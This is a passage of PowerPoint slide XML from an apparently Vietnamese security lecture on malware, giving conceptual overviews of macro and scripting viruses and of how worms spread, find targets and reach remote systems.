            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="312436732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295400" y="304800"/>
            <a:ext cx="10896600" cy="982268"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>III. MÃ ĐỘC</a:t>
            </a:r>
            <a:br>
              <a:rPr kumimoji="1" lang="en-GB">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Cơ chế lan truyền lây nhiễm nội dung – Virus</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4000" b="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Content Placeholder 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="1721708"/>
            <a:ext cx="10818812" cy="4189514"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="just"/>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB" altLang="en-US" b="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Macro và Scripting Virus</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="1">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T</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>rở nên rất phổ biến vào giữa những năm 1990</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="just">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Độc lập với nền tảng, lây nhiễm active content đ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ư</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ợc sử dụng phổ biến trong ứng dụng (nh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ư</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> macro trong tài liệu Office, scripting code trong tài liệu Adobe PDF). Nền tảng phần cứng, hệ điều hành hỗ trợ các ứng dụng này đều có thể bị nhiễm.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="just">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Lây nhiễm các tài liệu (document), không phải phần code ch</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ư</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ơng trình thực thi (program)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="just">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Dễ lây lan (vì tài liệu đ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ư</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ợc chia sẻ nhiều chẳng hạn nh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ư</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> qua email)  </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="just">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Lây nhiễm tài liệu ng</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ư</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ời dùng h</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>n là ch</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ư</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ơng trình hệ thống</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="285750" lvl="1" algn="just">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Khai thác khả năng tạo và thực thi macro của ứng dụng office, khả năng hỗ trợ các thành phần nhúng nh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ư</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> Javascript hay các loại scripting code khác của tài liệu  Adobe PDF. Có thể dùng để cài đặt một Trojan hoặc hoạt động nh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ư</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> một worm</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="374123716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fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="4000" b="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>III. MÃ ĐỘC</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="4000" b="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Cơ chế lan truyền khai thác lỗ hổng – Worm</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4000" b="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Content Placeholder 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1447800"/>
            <a:ext cx="8229600" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="just">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB" b="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Worms</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2400" noProof="1">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altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Chương trình có khả năng sao chép chính nó và lây lan qua mạng</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>khai thác lỗ hổng trên </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ứng dụng client và server để đạt quyền truy cập hệ thống mới</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2400" noProof="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="285750" lvl="1" algn="just">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Gồm các giai đoạn như một virus: dormant, propagation, triggering, execution.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="just">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Trong giai đoạn lây nhiễm (Propagation): tìm kiếm các hệ thống khác (bằng cách sử dụng thông tin các kho l</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ư</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>u trữ chi tiết truy cập hệ thống từ xa như các host tables, address books, buddy lists, trusted peers,…), kết nối với hệ thống mới thông qua c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> chế truy cập phất hiện đ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ư</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ợc, sao chép bản thân vào hệ thống từ xa và thực thi</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="285750" lvl="1" algn="just">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Có thể cải trang thành một chương trình hệ thống</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="2" name="Picture 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7D3A26D4-EEB2-4073-BB23-3DC11D13685C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="9448800" y="1524000"/>
            <a:ext cx="2609850" cy="5029200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="238044118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fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="4000" b="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>III. MÃ ĐỘC</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="4000" b="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Cơ chế lan truyền khai thác lỗ hổng – Worm</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4000" b="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Content Placeholder 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1600200"/>
            <a:ext cx="11353800" cy="4198938"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="just">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" b="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>C</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="vi-VN" b="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" b="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> chế worm sử dụng để phát hiện mục tiêu (scanning, fingerprinting)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2400" noProof="1">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altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Random</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="just">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Hit-list</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="just">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Topological</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" noProof="1">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altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Local subnet</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" noProof="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0300875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fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="4000" b="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>III. MÃ ĐỘC</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="4000" b="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Cơ chế lan truyền khai thác lỗ hổng – Worm</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4000" b="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Content Placeholder 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1600200"/>
            <a:ext cx="11353800" cy="4198938"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="just">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" b="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>C</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="vi-VN" b="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" b="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> chế worm sử dụng để truy cập hệ thống từ xa</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2400" noProof="1">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altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Email, instant message</a:t>
            </a:r>
          </a:p>
          <a:p>
